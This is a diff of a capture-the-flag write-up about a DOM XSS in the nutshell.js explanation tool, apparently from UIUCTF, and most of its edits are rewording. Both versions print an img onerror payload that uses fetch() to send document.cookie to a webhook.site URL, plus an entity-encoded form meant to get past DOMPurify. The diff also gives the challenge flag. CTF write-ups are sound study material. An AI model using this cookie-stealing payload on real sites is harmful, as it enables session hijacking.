@@ -11,11 +11,10 @@ This challenge is about a DOM XSS.
 
 ## Exploring the challenge
 
-The only web page available uses <code>nutshell.js</code>, a tool used to make "expandable, embeddable explanations". This tool takes the HTML specified 
-inside the GET parameter <code>nutshell</code> and renders and makes expandable all links that start with <code>:</code>. These links must refer to a a Youtube video, 
-a section of a Wikipedia article or a section of any web page (even the same one). To do this, the url specified in the <code>href</code> attribute must be of the 
-following format: <code>http[s]?://domain_name/path#text</code>, where <code>text</code> is the text inside a section tag (<code><h\*></code>).
-All elements present under this section are shown inside the produced baloon.
+The only web page available uses <code>nutshell.js</code>, a tool used to create "expandable and embeddable explanations". This tool takes the specified HTML
+inside the GET <code>nutshell</code> parameter and render all links starting with <code>:</code>. These links may refer to a Youtube video,
+a section of a Wikipedia article or a section of any web page (even the same). To do this, the url specified in the <code>href</code> attribute must be of the following format: <code>http[s]?://domain_name/path#text</code>, where <code>text</code> is the text inside a section tag (<code><h\*></code>).
+All the elements present in this section are shown inside the balloon produced.
 
 ![1](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/364d3adc-0c39-4743-a710-834dfdd3842d)
 
@@ -23,10 +22,10 @@ All elements present under this section are shown inside the produced baloon.
 
 ![3](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/f35b95c9-4ea8-4040-9697-bbe54f00409c)
 
-A user can send any url to the admin bot. It doesn't trigger any user event, so a possible XSS must be defined so that it executes automatically. 
+A user can submit any URL to the admin bot. It doesn't fire any user events, so you need to define a possible XSS so that triggers automatically.
 
 ## Attack
-The HTML defined inside the nutshell parameter passes through this code:
+The HTML defined inside the nutshell parameter goes through this code:
 ```javascript
 const $ = document.querySelector.bind(document);
       const nutshell = new URLSearchParams(location.search).get("nutshell");
@@ -73,12 +72,12 @@ Looking at the <code>nutshell.js</code>([[1]](#1)) we can see this piece of code
             ex.appendChild(ballDown);
 ...
 ```
-These instructions are executed as soon as the script is loaded, so without needing the user to click on the expandable link. It takes the text specified after the colon 
-inside the anchor tag and paste it inside a <code>span</code> element with innerHTML. This element is then appended to the page. 
-We can't just define the malicious HTML inside the anchor tag for two reasons: the innerText only refers to text and the HTML defined inside the nutshell parameter is 
-purified by DOMPurify from the page itself. We should define a text that can be interpreted as HTML, but is not HTML. How? Obfuscation!
-In order to trigger an XSS, a code like this: <code>\</span\>\<img src onerror='fetch("https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie="+document.cookie)'/\>\<span\></code> should be written like this: 
-<code>\&lt;/span\&gt;\&lt;img src onerror='fetch("<span>https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=</span>"+document.cookie)'/\&gt;\&lt;span\&gt;</code>. So:
+These instructions are executed as soon as the script loads, so without the user having to click the expandable link. Accepts the text specified after the colon
+inside the anchor tag and paste it inside a <code>span</code> element with innerHTML. This element is then added to the page. This is the sink where the malicious code goes.<br>
+We can't just define the malicious HTML inside the anchor tag for two reasons: the innerText only refers to the text and the HTML defined inside the nutshell parameter is
+purified by DOM Purify from the page itself. We should define text that can be interpreted as HTML, but isn't HTML. How? Obfuscation!
+To trigger an XSS, a code like this: <code>\</span\>\<img src onerror='fetch("https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/? cookie= "+document.cookie)'/\>\<span\></code> should be written like this:
+<code>\&lt;/span\&gt;\&lt;img src onerror='fetch("<span>https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=</span> "+document.cookie)'/\&gt;\&lt;span\&gt;</code>. So:
 ```HTML
 <HTML>
 <body>
@@ -89,11 +88,10 @@ In order to trigger an XSS, a code like this: <code>\</span\>\<img src onerror='
 </body>
 </HTML>
 ```
-If we click on the preview button, the client is redirected to the same page but with nutshell parameter containing the malicious HTML. 
-The XSS should be triggered. If we send the page's url to the admin bot, its cookie (the flag) is obtained.
+If we click the preview button, the client is redirected to the same page but with the nutshell parameter containing the malicious HTML.
+The XSS should be triggered. If we send the url of the page to the admin bot, we get its cookie (the flag).
 
 ![peanut_xss_flag](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/4a45e29f-728b-4ce3-9390-19aa51fafece)
-
 
 Flag is <code>uiuctf{cr4ck1ng_0open_somE_nuTsh3lls}</code>
 
